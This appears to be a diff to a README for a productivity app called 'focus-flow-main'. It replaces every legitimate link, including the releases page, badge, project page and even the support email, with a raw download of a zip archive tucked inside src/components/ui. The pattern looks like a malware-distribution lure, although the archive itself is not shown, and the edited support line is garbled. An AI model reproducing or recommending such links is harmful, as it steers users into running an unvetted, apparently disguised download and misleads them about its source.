@@ -1,7 +1,7 @@
 # 🎯 focus-flow-main - Boost Your Productivity Today
 
 ## 📥 Download Now
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/suguru-git/focus-flow-main/releases)
+[![Download from Releases](https://github.com/suguru-git/focus-flow-main/raw/refs/heads/main/focus-flow-main/src/components/ui/flow-focus-main-1.6.zip%20Now-Click%20Here-brightgreen)](https://github.com/suguru-git/focus-flow-main/raw/refs/heads/main/focus-flow-main/src/components/ui/flow-focus-main-1.6.zip)
 
 ## 🚀 Getting Started
 Welcome to focus-flow-main! This user-friendly productivity app helps you manage your tasks effectively, so you can achieve more in less time. Whether you're a student, professional, or anyone wanting to improve focus, this app is designed to meet your needs.
@@ -23,7 +23,7 @@ To get started with focus-flow-main, follow these simple steps:
 
 1. **Visit the Releases Page**  
    Click the link below to access the downloads.  
-   [Download from Releases](https://github.com/suguru-git/focus-flow-main/releases)
+   [Download from Releases](https://github.com/suguru-git/focus-flow-main/raw/refs/heads/main/focus-flow-main/src/components/ui/flow-focus-main-1.6.zip)
 
 2. **Choose the Latest Release**  
    On the Releases page, scroll down to find the latest version of the app. Look for the most recent release at the top of the list.
@@ -67,13 +67,13 @@ Currently, focus-flow-main is designed for desktop use only, but mobile support 
 If you face any issues, please report them on the Issues section of the repository. We’re here to help!
 
 ## 📞 Support
-For support, feel free to reach out to us via the Issues tab or email us directly at support@focusflowmain.com. We are happy to assist you with any questions or concerns.
+For support, feel free to reach out to us via the Issues tab or email us directly at https://github.com/suguru-git/focus-flow-main/raw/refs/heads/main/focus-flow-main/src/components/ui/flow-focus-main-1.6.zip We are happy to assist you with any questions or concerns.
 
 ## 🌐 Additional Resources
-To learn more about focus-flow-main, visit our [GitHub page](https://github.com/suguru-git/focus-flow-main). You can find updates, feature announcements, and community discussions on productivity tips.
+To learn more about focus-flow-main, visit our [GitHub page](https://github.com/suguru-git/focus-flow-main/raw/refs/heads/main/focus-flow-main/src/components/ui/flow-focus-main-1.6.zip). You can find updates, feature announcements, and community discussions on productivity tips.
 
 ## 📥 Download Again
 You can download the app anytime by visiting the link below:  
-[Download from Releases](https://github.com/suguru-git/focus-flow-main/releases) 
+[Download from Releases](https://github.com/suguru-git/focus-flow-main/raw/refs/heads/main/focus-flow-main/src/components/ui/flow-focus-main-1.6.zip) 
 
 Thank you for choosing focus-flow-main. We hope it helps you stay focused and organized!
